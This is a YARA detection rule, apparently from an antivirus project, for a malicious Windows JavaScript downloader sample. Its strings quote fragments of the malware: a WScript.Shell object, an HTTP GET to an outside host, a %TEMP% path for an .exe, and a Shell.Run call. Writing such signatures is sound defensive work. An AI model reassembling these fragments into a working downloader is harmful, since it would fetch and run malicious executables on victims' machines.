rule sig_20160330_52da38486f1ff91b0d712de42f8e9444 {
  meta:
    description = "datamaliciousorder - file 20160330_52da38486f1ff91b0d712de42f8e9444.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a87d9a339cb1d60b8a8b35a6060f94a7af39b1a10d99fe206c29fe03138c41c1"

  strings:
    $s1  = "function _A(_H, _B1){_F0 = _F0 * 1; return _H - _B1;};" fullword ascii
    $s2  = "var _NM = function _LO() {return WScript[_G0](\"WScript\"+\".Shell\");}(), _CE0 = 11;" fullword ascii
    $s3  = "_MK[_JA](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s4  = "if (_MK[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _Q(){return _Q0 + \"\";};" fullword ascii
    $s6  = "function _UV() {return _NM[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qii83To7p2YDm.ex\" + \"e\";};" fullword ascii
    $s7  = "function _CE() {return ((_TU == true) && (_TU == _II)) ? 1 : _F0;};" fullword ascii
    $s8  = "function _NQ(_B0){_NM[\"Run\"](_B0, _F0, _F0);};" fullword ascii
    $s9  = "function _F()" fullword ascii
    $s10 = "var _BR = new this[\"Date\"]();" fullword ascii
    $s11 = "function _ET(){return 22;};" fullword ascii
    $s12 = "return _A(_W, _BH);" fullword ascii
    $s13 = "function _KJ(_D) {var _M = (1, 2, 3, 4, 5, _D); return _M;};" fullword ascii
    $s14 = " while (_A0){" fullword ascii
    $s15 = "function _X(){return _G0;};" fullword ascii
    $s16 = "var _SO = false;" fullword ascii
    $s17 = "var _TU = false;" fullword ascii
    $s18 = "_II = true; " fullword ascii
    $s19 = "_TU = true; " fullword ascii
    $s20 = "var _II = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}